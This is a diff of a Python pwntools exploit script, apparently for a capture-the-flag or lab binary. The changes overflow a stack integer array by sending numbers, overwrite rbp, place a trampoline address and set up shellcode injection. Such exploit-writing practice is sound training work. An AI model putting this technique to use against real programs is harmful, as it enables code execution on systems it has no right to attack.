@@ -52,8 +52,17 @@ if __name__ == "__main__":
     # process_to_exploit = process(local_binary_file)
     # process_to_exploit = gdb.debug(local_binary_file)
 
-    # To overflow the buffer, I prepare to send 128+8 bytes.
-    buffer_overflower = b"0"*136
+    # The victim code reads numbers into an int array.
+    # The int array is only meant to hold eight ints.
+    # To overflow the stack, I just read in enough ints to overwrite rbp.
+    for counter in range(14):
+        process_to_exploit.sendlineafter(b"number:", b"" + str(counter).encode())
+
+    # Once I have overwritten rbp, I can drop the trampoline address onto the stack.
+    # Because the input only reads in 32-bits at a time, I need to add extra zeros to 
+    # ensure the full 64-bit address is correct on the stack.
+    process_to_exploit.sendlineafter(b"number:", str(trampoline_address).encode())
+    process_to_exploit.sendlineafter(b"number:", b"0")
 
     # Now, I'm ready to send in the shellcode. 
     # As mentioned, I can only send in 32-bits at a time. 
